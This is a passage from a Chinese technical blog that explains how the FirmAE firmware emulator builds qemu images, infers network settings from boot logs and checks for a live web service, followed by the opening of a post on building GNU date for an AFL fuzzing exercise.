                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/FirmAE/" itemprop="url" rel="index"><span itemprop="name">FirmAE</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在run.sh中，FirmAE会检查当前固件是否在之前仿真成功过，如果是第一次仿真或者是之前仿真失败，FirmAE会重新开始创建镜像、生成qemu启动网络配置的工作；如果之前已经仿真成功了，则直接执行之前的启动命令。</p>
<h2 id="run-sh：是否之前仿真成功"><a href="#run-sh：是否之前仿真成功" class="headerlink" title="run.sh：是否之前仿真成功"></a>run.sh：是否之前仿真成功</h2><p>如下是关键代码，其中<code>$&#123;WORK_DIR&#125;</code>目录是工作目录，对应着实际的目录<code>scratch/固件编号/</code>目录。<code>$&#123;WORK_DIR&#125;/web</code>是web仿真成功的标志文件，FirmAE仿真成功一个目录则会在其中写入<code>true</code>。<code>./scripts/makeImage.sh</code>是创建qemu镜像、将文件系统写入到镜像、并对文件系统做修改的脚本；<code>./scripts/makeNetwork.py</code>则是负责生成qemu运行命令、配置qemu启动命令的参数，也是这篇文章将要简单说明的。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">if (! egrep -sqi &quot;true&quot; $&#123;WORK_DIR&#125;/web); then</span><br><span class="line">    # ================================</span><br><span class="line">    # make qemu image</span><br><span class="line">    # ================================</span><br><span class="line">    t_start=&quot;$(date -u +%s.%N)&quot;</span><br><span class="line">    # 查询数据库</span><br><span class="line">    ./scripts/tar2db.py -i $IID -f ./images/$IID.tar.gz -h $PSQL_IP \</span><br><span class="line">        2&gt;&amp;1 &gt; $&#123;WORK_DIR&#125;/tar2db.log</span><br><span class="line">    t_end=&quot;$(date -u +%s.%N)&quot;</span><br><span class="line">    time_tar=&quot;$(bc &lt;&lt;&lt;&quot;$t_end-$t_start&quot;)&quot;</span><br><span class="line">    echo $time_tar &gt; $&#123;WORK_DIR&#125;/time_tar</span><br><span class="line"></span><br><span class="line">    t_start=&quot;$(date -u +%s.%N)&quot;</span><br><span class="line">    # 制作qemu镜像</span><br><span class="line">    ./scripts/makeImage.sh $IID $ARCH $FILENAME \</span><br><span class="line">        2&gt;&amp;1 &gt; $&#123;WORK_DIR&#125;/makeImage.log</span><br><span class="line">    t_end=&quot;$(date -u +%s.%N)&quot;</span><br><span class="line">    time_image=&quot;$(bc &lt;&lt;&lt;&quot;$t_end-$t_start&quot;)&quot;</span><br><span class="line">    echo $time_image &gt; $&#123;WORK_DIR&#125;/time_image</span><br><span class="line"></span><br><span class="line">    # ================================</span><br><span class="line">    # infer network interface</span><br><span class="line">    # ================================</span><br><span class="line">    t_start=&quot;$(date -u +%s.%N)&quot;</span><br><span class="line">    echo &quot;[*] infer network start!!!&quot;</span><br><span class="line">    # TIMEOUT is set in &quot;firmae.config&quot;. This TIMEOUT is used for initial</span><br><span class="line">    # log collection.</span><br><span class="line">    TIMEOUT=$TIMEOUT FIRMAE_NET=$&#123;FIRMAE_NET&#125; \</span><br><span class="line">      ./scripts/makeNetwork.py -i $IID -q -o -a $&#123;ARCH&#125; \</span><br><span class="line">      &amp;&gt; $&#123;WORK_DIR&#125;/makeNetwork.log</span><br><span class="line">    # run_debug.sh等实际上都是./run.sh的软连接</span><br><span class="line">    ln -s ./run.sh $&#123;WORK_DIR&#125;/run_debug.sh | true</span><br><span class="line">    ln -s ./run.sh $&#123;WORK_DIR&#125;/run_analyze.sh | true</span><br><span class="line">    ln -s ./run.sh $&#123;WORK_DIR&#125;/run_boot.sh | true</span><br><span class="line"></span><br><span class="line">    t_end=&quot;$(date -u +%s.%N)&quot;</span><br><span class="line">    time_network=&quot;$(bc &lt;&lt;&lt;&quot;$t_end-$t_start&quot;)&quot;</span><br><span class="line">    echo $time_network &gt; $&#123;WORK_DIR&#125;/time_network</span><br><span class="line">else</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果之前仿真成功过则直接仿真</span></span><br><span class="line">    echo &quot;[*] $&#123;INFILE&#125; already succeed emulation!!!&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<h2 id="makeNetwork-py：生成最终的qemu启动命令"><a href="#makeNetwork-py：生成最终的qemu启动命令" class="headerlink" title="makeNetwork.py：生成最终的qemu启动命令"></a>makeNetwork.py：生成最终的qemu启动命令</h2><p><code>makeNetwork.py</code>是进行网络处理的python脚本，里面大概包含了首次通过命令启动qemu虚拟机、然后分析qemu虚拟机的启动日志、生成新的启动参数、通过新的qemu命令再次启动虚拟机，并检查虚拟机的web服务器启动状况。</p>
<p><code>makeNetwork.py</code>中调用的关键函数如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">main</span><br><span class="line">  -&gt; process</span><br><span class="line">    -&gt; inferNetwork</span><br><span class="line">    -&gt; checkNetwork</span><br></pre></td></tr></table></figure>
<h3 id="inferNetwork函数：首次启动QEMU虚拟机并分析启动日志"><a href="#inferNetwork函数：首次启动QEMU虚拟机并分析启动日志" class="headerlink" title="inferNetwork函数：首次启动QEMU虚拟机并分析启动日志"></a>inferNetwork函数：首次启动QEMU虚拟机并分析启动日志</h3><h4 id="1-首次启动虚拟机"><a href="#1-首次启动虚拟机" class="headerlink" title="1. 首次启动虚拟机"></a>1. 首次启动虚拟机</h4><p><code>inferNetwork</code>函数会重新挂载qemu磁盘，获取磁盘文件系统中的一些启动服务，在文件系统中修改<code>preInit.sh</code>脚本，并生成QEMU启动命令。QEMU启动命令会增加<code>rdinit=/firmadyne/preInit.sh</code>参数，使得虚拟机启动后会首先去执行该脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Running firmware %d: terminating after %d secs...&quot;</span> % (iid, TIMEOUT))</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;timeout --preserve-status --signal SIGINT &#123;0&#125; &quot;</span>.<span class="built_in">format</span>(TIMEOUT)</span><br><span class="line">cmd += <span class="string">&quot;&#123;0&#125;/run.&#123;1&#125;.sh \&quot;&#123;2&#125;\&quot; \&quot;&#123;3&#125;\&quot; &quot;</span>.<span class="built_in">format</span>(SCRIPTDIR,</span><br><span class="line">                                                arch + endianness,</span><br><span class="line">                                                iid,</span><br><span class="line">                                                qemuInitValue)</span><br><span class="line">cmd += <span class="string">&quot; 2&gt;&amp;1 &gt; /dev/null&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(SCRATCHDIR + <span class="string">&quot;/&quot;</span> + <span class="built_in">str</span>(iid) + <span class="string">&quot;/qemu.init.cmd&quot;</span>, <span class="string">&quot;w+&quot;</span>) <span class="keyword">as</span> out:</span><br><span class="line">    out.write(cmd)</span><br><span class="line"><span class="comment"># 首次执行虚拟机，设置了时间上的延迟，因此这个地方的时间是必须等待的</span></span><br><span class="line">os.system(cmd)</span><br></pre></td></tr></table></figure>

<p>首次执行的qemu虚拟机启动命令如下，这次仿真所消耗的时间就是6分钟：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timeout --preserve-status --signal SIGINT 240 /home/utest/app/FirmAE/scripts/run.mipseb.sh &quot;3&quot; &quot;rdinit=/firmadyne/preInit.sh&quot;  2&gt;&amp;1 &gt; /dev/null</span><br></pre></td></tr></table></figure>

<p>我从一个已经启动的虚拟机中查看脚本内容如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/firmadyne/sh</span></span><br><span class="line"></span><br><span class="line">BUSYBOX=/firmadyne/busybox</span><br><span class="line"></span><br><span class="line">[ -d /dev ] || <span class="built_in">mkdir</span> -p /dev</span><br><span class="line">[ -d /root ] || <span class="built_in">mkdir</span> -p /root</span><br><span class="line">[ -d /sys ] || <span class="built_in">mkdir</span> -p /sys</span><br><span class="line">[ -d /proc ] || <span class="built_in">mkdir</span> -p /proc</span><br><span class="line">[ -d /tmp ] || <span class="built_in">mkdir</span> -p /tmp</span><br><span class="line"><span class="built_in">mkdir</span> -p /var/lock</span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;BUSYBOX&#125;</span> mount -t sysfs sysfs /sys</span><br><span class="line"><span class="variable">$&#123;BUSYBOX&#125;</span> mount -t proc proc /proc</span><br><span class="line"><span class="variable">$&#123;BUSYBOX&#125;</span> <span class="built_in">ln</span> -sf /proc/mounts /etc/mtab</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line"><span class="variable">$&#123;BUSYBOX&#125;</span> mount -t devpts devpts /dev/pts</span><br><span class="line"><span class="variable">$&#123;BUSYBOX&#125;</span> mount -t tmpfs tmpfs /run</span><br><span class="line"></span><br><span class="line">/sbin/init &amp;</span><br><span class="line"></span><br><span class="line">/firmadyne/network.sh &amp;</span><br><span class="line">/firmadyne/run_service.sh &amp;</span><br><span class="line">/firmadyne/debug.sh</span><br><span class="line">/firmadyne/busybox <span class="built_in">sleep</span> 36000</span><br></pre></td></tr></table></figure>

<p>可以看到脚本会创建一些必备的目录以提高仿真生成率（来自FirmAE论文，有数据证实），并挂载一些设备。然后执行文件系统中的<code>/sbin/init</code>，这个或许在真实设备中是首次执行的程序。最后会运行内置的一些脚本，启动<code>debug.sh</code>是FirmAE较FirmAdyne所没有的。还有一个sleep命令，应该是为了等待启动成功。</p>
<h4 id="2-分析启动日志"><a href="#2-分析启动日志" class="headerlink" title="2. 分析启动日志"></a>2. 分析启动日志</h4><p>虚拟机首次执行是有时间限制的，时间到后关闭虚拟机。随后<code>inferNetwork</code>函数会分析qemu启动日志，从中得到例如开放端口、IP、MAC地址改变等信息，然后返回。FirmAE的内核源码是被修改过的，对一些关键系统调用做了hook，因此是可以在qemu启动日志中得到许多信息。这些信息随后会辅助生成最终的qemu启动命令。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开始分析qemu虚拟机首次启动的日志</span></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;%s/qemu.initial.serial.log&quot;</span> % targetDir, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 寻找开放端口</span></span><br><span class="line">ports = findPorts(data, endianness)</span><br><span class="line"></span><br><span class="line"><span class="comment">#find interfaces with non loopback ip addresses</span></span><br><span class="line">ifacesWithIps = findNonLoInterfaces(data, endianness)</span><br><span class="line"><span class="comment">#find changes of mac addresses for devices</span></span><br><span class="line"><span class="comment"># 寻找MAC地址的变化</span></span><br><span class="line">macChanges = findMacChanges(data, endianness)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*] Interfaces: %r&#x27;</span> % ifacesWithIps)</span><br><span class="line"></span><br><span class="line">networkList = getNetworkList(data, ifacesWithIps, macChanges)</span><br><span class="line"><span class="keyword">return</span> qemuInitValue, networkList, targetFile, targetData, ports</span><br></pre></td></tr></table></figure>

<h3 id="checkNetwork函数"><a href="#checkNetwork函数" class="headerlink" title="checkNetwork函数"></a>checkNetwork函数</h3><p>继续返回到<code>process</code>函数中，接下来会调用<code>checkNetwork</code>函数。该函数的主要功能是从<code>inferNetwork</code>函数提取的日志信息<code>networkList</code>中分析虚拟机的网络类型。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> vlanNetworkList:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;has vlan ethernet&quot;</span>)</span><br><span class="line">    filterNetworkList = vlanNetworkList</span><br><span class="line">    result = <span class="string">&quot;normal&quot;</span></span><br><span class="line"><span class="keyword">elif</span> ethNetworkList:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;has ethernet&quot;</span>)</span><br><span class="line">    filterNetworkList = ethNetworkList</span><br><span class="line">    result = <span class="string">&quot;normal&quot;</span></span><br><span class="line"><span class="keyword">elif</span> invalidEthNetworkList:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;has ethernet and invalid IP&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> (ip, dev, vlan, mac, brif) <span class="keyword">in</span> invalidEthNetworkList:</span><br><span class="line">        filterNetworkList.append((<span class="string">&#x27;192.168.0.1&#x27;</span>, dev, vlan, mac, brif))</span><br><span class="line">    result = <span class="string">&quot;reload&quot;</span></span><br><span class="line"><span class="keyword">elif</span> brNetworkList:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;only has bridge interface&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> (ip, dev, vlan, mac, brif) <span class="keyword">in</span> brNetworkList:</span><br><span class="line">        <span class="keyword">if</span> devList:</span><br><span class="line">            dev = devList.pop(<span class="number">0</span>)</span><br><span class="line">            filterNetworkList.append((ip, dev, vlan, mac, brif))</span><br><span class="line">    result = <span class="string">&quot;bridge&quot;</span></span><br><span class="line"><span class="keyword">elif</span> invalidBrNetworkList:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;only has bridge interface and invalid IP&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> (ip, dev, vlan, mac, brif) <span class="keyword">in</span> invalidBrNetworkList:</span><br><span class="line">        <span class="keyword">if</span> devList:</span><br><span class="line">            dev = devList.pop(<span class="number">0</span>)</span><br><span class="line">            filterNetworkList.append((<span class="string">&#x27;192.168.0.1&#x27;</span>, dev, vlan, mac, brif))</span><br><span class="line">    result = <span class="string">&quot;bridgereload&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="test-emulation-sh：第二次启动虚拟机并分析网络仿真结果"><a href="#test-emulation-sh：第二次启动虚拟机并分析网络仿真结果" class="headerlink" title="test_emulation.sh：第二次启动虚拟机并分析网络仿真结果"></a>test_emulation.sh：第二次启动虚拟机并分析网络仿真结果</h3><p>通过首次仿真的结果，我们可以得到一系列的信息，例如网络列表、端口等等。这些信息将用于生成最终的qemu启动命令。如下还是<code>process</code>函数中，根据首次仿真的日志得到一些关键信息，用于生成最后的仿真命令<code>qemuCommandLine</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">qemuCommandLine = qemuCmd(iid,</span><br><span class="line">                          filterNetworkList,</span><br><span class="line">                          ports,</span><br><span class="line">                          network_type,</span><br><span class="line">                          arch,</span><br><span class="line">                          endianness,</span><br><span class="line">                          qemuInitValue,</span><br><span class="line">                          isUserNetwork)</span><br><span class="line"><span class="comment"># 重新生成了QEMU命令</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(outfile, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> out:</span><br><span class="line">    out.write(qemuCommandLine)</span><br><span class="line">os.chmod(outfile, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;./scripts/test_emulation.sh &#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(iid, arch + endianness))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (os.path.exists(SCRATCHDIR + <span class="string">&#x27;/&#x27;</span> + <span class="built_in">str</span>(iid) + <span class="string">&#x27;/web&#x27;</span>) <span class="keyword">and</span></span><br><span class="line">    <span class="built_in">open</span>(SCRATCHDIR + <span class="string">&#x27;/&#x27;</span> + <span class="built_in">str</span>(iid) + <span class="string">&#x27;/web&#x27;</span>).read().strip() == <span class="string">&#x27;true&#x27;</span>):</span><br><span class="line">    success = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>随后调用<code>test_emulation.sh</code>去执行这条仿真命令，该虚拟机启动命令在后台执行：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;[*] test emulator&quot;</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;WORK_DIR&#125;/run.sh 2&gt;&amp;1 &gt;<span class="variable">$&#123;WORK_DIR&#125;</span>/emulation.log &amp;</span></span><br><span class="line"></span><br><span class="line">sleep 10</span><br></pre></td></tr></table></figure>

<p>脚本还会调用<code>check_network</code>函数检查虚拟机的网络仿真状态，主要是通过ping和访问web服务端口来判断：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;[*] Waiting web service... from $&#123;IPS[@]&#125;&quot;</span><br><span class="line">read IP PING_RESULT WEB_RESULT TIME_PING TIME_WEB &lt; &lt;(check_network &quot;$&#123;IPS[@]&#125;&quot; false)</span><br><span class="line"></span><br><span class="line">if ($&#123;PING_RESULT&#125;); then</span><br><span class="line">    echo true &gt; $&#123;WORK_DIR&#125;/ping</span><br><span class="line">    echo $&#123;TIME_PING&#125; &gt; $&#123;WORK_DIR&#125;/time_ping</span><br><span class="line">    echo $&#123;IP&#125; &gt; $&#123;WORK_DIR&#125;/ip</span><br><span class="line">fi</span><br><span class="line">if ($&#123;WEB_RESULT&#125;); then</span><br><span class="line">    echo true &gt; $&#123;WORK_DIR&#125;/web</span><br><span class="line">    echo $&#123;TIME_WEB&#125; &gt; $&#123;WORK_DIR&#125;/time_web</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p><code>check_network</code>函数的代码如下，循环通过ping判断虚拟机是否存活，以及通过curl判断WEB服务是否启动起来，然后写入到固件工作目录的状态文件：<code>$&#123;WORK_DIR&#125;/ping</code>和<code>$&#123;WORK_DIR&#125;/web</code>中。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">check_network () &#123;</span><br><span class="line">    sleep 10</span><br><span class="line"></span><br><span class="line">    IPS=(&quot;$&#123;@&#125;&quot;)</span><br><span class="line">    DEBUG_MODE=$&#123;IPS[-1]&#125;</span><br><span class="line">    unset &#x27;IPS[$&#123;#IPS[@]&#125;-1]&#x27;</span><br><span class="line"></span><br><span class="line">    PING_RESULT=false</span><br><span class="line">    PING_TIME=-1</span><br><span class="line">    WEB_RESULT=false</span><br><span class="line">    WEB_TIME=-1</span><br><span class="line">    RET_IP=&quot;None&quot;</span><br><span class="line"></span><br><span class="line">    START_TIME=$(date +%s | bc)</span><br><span class="line">    CURRENT_TIME=$(date +%s | bc)</span><br><span class="line">    t_start=$(date +%s.%N)</span><br><span class="line">    while [ $&#123;CURRENT_TIME&#125; -le $[$&#123;START_TIME&#125; + $&#123;CHECK_TIMEOUT&#125;] ]</span><br><span class="line">    do</span><br><span class="line">        for IP in &quot;$&#123;IPS[@]&#125;&quot;</span><br><span class="line">        do</span><br><span class="line">            if (curl --max-time 2 --output /dev/null --silent http://$&#123;IP&#125; || curl --max-time 2 --output /dev/null --silent https://$&#123;IP&#125;); then</span><br><span class="line">                t_end=$(date +%s.%N)</span><br><span class="line">                if (! $&#123;WEB_RESULT&#125;); then</span><br><span class="line">                    WEB_TIME=$(echo &quot;$t_end - $t_start&quot; | bc)</span><br><span class="line">                fi</span><br><span class="line">                if (! $&#123;PING_RESULT&#125;); then</span><br><span class="line">                    PING_TIME=$&#123;WEB_TIME&#125;</span><br><span class="line">                fi</span><br><span class="line">                PING_RESULT=true</span><br><span class="line">                WEB_RESULT=true</span><br><span class="line">                RET_IP=$&#123;IP&#125;</span><br><span class="line">            fi</span><br><span class="line">            if (ping -c 1 $&#123;IP&#125; &gt; /dev/null); then</span><br><span class="line">                t_end=$(date +%s.%N)</span><br><span class="line">                if (! $&#123;PING_RESULT&#125;); then</span><br><span class="line">                    PING_TIME=$(echo &quot;$t_end - $t_start&quot; | bc)</span><br><span class="line">                fi</span><br><span class="line">                PING_RESULT=true</span><br><span class="line">                RET_IP=$&#123;IP&#125;</span><br><span class="line">            fi</span><br><span class="line">            sleep 1</span><br><span class="line">            CURRENT_TIME=$(date +%s | bc)</span><br><span class="line">        done</span><br><span class="line"></span><br><span class="line">        if ($&#123;WEB_RESULT&#125;); then</span><br><span class="line">            break</span><br><span class="line">        fi</span><br><span class="line">    done</span><br><span class="line"></span><br><span class="line">    echo &quot;$&#123;RET_IP&#125;&quot; &quot;$&#123;PING_RESULT&#125;&quot; &quot;$&#123;WEB_RESULT&#125;&quot; &quot;$&#123;PING_TIME&#125;&quot; &quot;$&#123;WEB_TIME&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此，关键脚本<code>makeNetwork.py</code>分析完成。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>以前在看FirmAE论文的时候，论文中强调仿真采用了启发式的分析方法，其实这个启发式主要就是对固件的文件系统和网络进行分析，然后进行相应的patch。</p>
<p>对于文件系统，FirmAE会分析其中的web服务、服务程序中所需的文件和文件夹和设备、然后生成脚本在启动时创建相应的文件和文件夹，挂载相应的设备。对于网络配置，FirmAE会在分析阶段启动两次qemu虚拟机。第一次是为了获取到网络配置信息，然后生成新的qemu启动命令；第二次是为了判断虚拟机是否被启动、web服务是否被启动。</p>
<p>综合来说，FirmAE的时间消耗大头是在网络配置上，要是不顺利的话，第一次网络启动会默认消耗6分钟、第二次也会消耗6分钟。而且，FirmAE真正启动还会再执行一次qemu虚拟机的启动，也就是说，从固件到仿真成功，一共需要执行三次qemu虚拟机。</p>
<p>出于个人需求，FirmAE对我来说在判断逻辑上还可以改改。例如有时候WEB服务着实启动条件比较苛刻，需要对WEB程序进行patch，这种场景下我们实际上只想让FirmAE快速搭建起来一个qemu虚拟机，在网络判定的时候ping能够ping通就行，web服务可以自己连接到虚拟机上去手动启动。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/13/[afl-training]%20date/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="ToT">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/13/%5Bafl-training%5D%20date/" class="post-title-link" itemprop="url">[afl-training] date</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-13 10:23:03 / Modified: 10:26:29" itemprop="dateCreated datePublished" datetime="2023-04-13T10:23:03+08:00">2023-04-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/AFL/" itemprop="url" rel="index"><span itemprop="name">AFL</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="afl-training-date"><a href="#afl-training-date" class="headerlink" title="[afl-training] date"></a>[afl-training] date</h1><p>date 的这个漏洞也是使用 AFL 发现的。通过查看 date 的 man 手册，可以看到 date 可以从命令行、日期相关系统调用、环境变量和一些文件中读取输入。此次 challenge 是如何对一个程序的环境变量进行 fuzz，个人还是比较重视这个 challenge，因为我的毕业设计是打算对 IoT 固件中的 CGI 程序进行模糊测试，而 CGI 程序大多是从环境变量以及标准输入 STDIN 中获取数据，然后处理完毕后通过标准输出 STDOUT 输出，做完这个 challenge 应该就可以开始进行毕业设计的总体实现了。</p>
<h2 id="编译-date"><a href="#编译-date" class="headerlink" title="编译 date"></a>编译 date</h2><p>首先对 date 的源码进行编译，和之前的 challenge 类似，需要使用 afl-clang-fast 以及开启 AFL_USE_ASAN&#x3D;1 编译选项。</p>
<p>进入 challenge 中的 date 目录，下载源码，并编译时必要的依赖。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git submodule init &amp;&amp; git submodule update</span><br><span class="line">sudo apt install autopoint bison gperf autoconf texinfo</span><br></pre></td></tr></table></figure>

<p>编译 date</p>
